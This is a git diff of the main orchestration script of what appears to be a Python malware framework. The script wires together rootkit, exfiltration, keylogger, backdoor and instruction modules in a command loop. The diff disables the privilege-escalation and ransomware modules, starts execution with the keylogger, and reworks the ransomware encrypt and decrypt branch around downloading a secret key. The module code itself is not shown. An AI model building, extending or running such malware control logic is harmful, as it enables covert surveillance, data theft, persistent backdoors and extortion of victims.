@@ -4,14 +4,14 @@
 
 from time import sleep
 
-from modules import privesc
+# from modules import privesc
 from modules import rootkit
 # from modules import propagation
 from modules import exfiltration
 from modules import keylogger
 from modules import backdoor
 from modules import instructions
-from modules import ransomware
+# from modules import ransomware
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
@@ -28,18 +28,18 @@ def main():
 
     # map modules to function
     modules = {
-        "privesc": privesc.run,
+        # "privesc": privesc.run,
         "rootkit": rootkit.run,
         # "propagation": propagation.run,
         "exfiltration": exfiltration.run,
         "keylogger": keylogger.run,
         "backdoor": backdoor.run,
         "instructions": instructions.run,
-        "ransomware": ransomware.run,
+        # "ransomware": ransomware.run,
     }
 
     # First step
-    next_step = "privesc"
+    next_step = "keylogger"
     result = None
 
     while next_step != "clean":
@@ -58,9 +58,12 @@ def main():
                     elif result[1] == 'stop': backdoor.stop_backdoor(attacker_ip = result[2])
 
             elif result[0] == 'ransomware':
-                if len(result) >= 3:
-                    if result[1] == 'deploy': deploy_ransomware(key = result[2])
-                    elif result[1] == 'decrypt': decrypt_ransomware(key = result[2])
+                if result[1] == 'encrypt': 
+                    instructions.download_secret_key()
+                    # ransomware.encrypt_ransomware(key = result[2])
+                elif result[1] == 'decrypt':
+                    instructions.download_secret_key()
+                    # ransomware.decrypt_ransomware(key = result[2])
 
             if result != 'no_data': instructions.reset_instruction()
         elif not result:
